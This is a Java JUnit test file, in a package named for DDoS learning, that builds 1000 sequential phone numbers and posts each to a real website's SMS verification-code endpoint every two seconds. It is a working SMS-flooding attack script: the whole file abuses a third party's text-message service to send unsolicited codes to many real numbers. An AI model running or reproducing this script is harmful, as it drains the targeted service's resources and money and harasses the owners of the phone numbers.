package com.zq.learn.ddos.act;

import com.alibaba.fastjson.JSON;
import com.zq.learn.ddos.greenpower.GreenPowerResponse;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * ${DESCRIPTION}
 *
 * @author qun.zheng
 * @create 2018/1/17
 **/
@RunWith(SpringRunner.class)
@SpringBootTest
public class ActTest {

    @Autowired
    private RestTemplate restTemplate;

    private ScheduledThreadPoolExecutor threadPool;

    @Before
    public void setup() {
        threadPool = new ScheduledThreadPoolExecutor(1);
        /*threadPool = new ThreadPoolExecutor(
                1, 16, 0, TimeUnit.SECONDS,
                new ArrayBlockingQueue<Runnable>(1000));*/
    }

    @Test
    public void testSendValidateCode() throws InterruptedException {
        List<String> phoneNums = generatePhoneNums();

        CountDownLatch doneSignal = new CountDownLatch(1);

        threadPool.scheduleAtFixedRate(new SendValidateTask(phoneNums, doneSignal), 2, 2, TimeUnit.SECONDS);
        /*phoneNums.forEach(p -> {
            threadPool.execute(new SendValidateTask(p,doneSignal));
        });*/

        doneSignal.await();
    }

    private class SendValidateTask implements Runnable {

        private LinkedList<String> phoneNums;
        private CountDownLatch doneSignal;

        public SendValidateTask(List<String> phoneNums, CountDownLatch doneSignal) {
            this.phoneNums = new LinkedList<>(phoneNums);
            this.doneSignal = doneSignal;
        }

        @Override
        public void run() {
            if (phoneNums.size() <= 0) {
                doneSignal.countDown();
                return;
            }
            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

            MultiValueMap<String, String> map = new LinkedMultiValueMap<>();
            String phone = phoneNums.removeFirst();
            System.out.println("发送短信到" + phone);
            map.add("mobile", phone);

            HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(map, headers);

            try {
                GreenPowerResponse greenPowerResponse = restTemplate.postForObject("http://91greenpower.com/sendShortMsg", request, GreenPowerResponse.class);
                System.out.println(JSON.toJSONString(greenPowerResponse));
            }catch (Exception e){
                System.out.println("发送失败...");
            }
        }
    }

    private List<String> generatePhoneNums(){
        List<String> list = new ArrayList<>();
        long startNum = 17761374970l;
        for(int i = 0;i < 1000;i++) {
            list.add(String.valueOf(startNum + 2 * i));
        }
        return list;
    }

    @After
    public void shutdown() {
        threadPool.shutdown();
    }

}
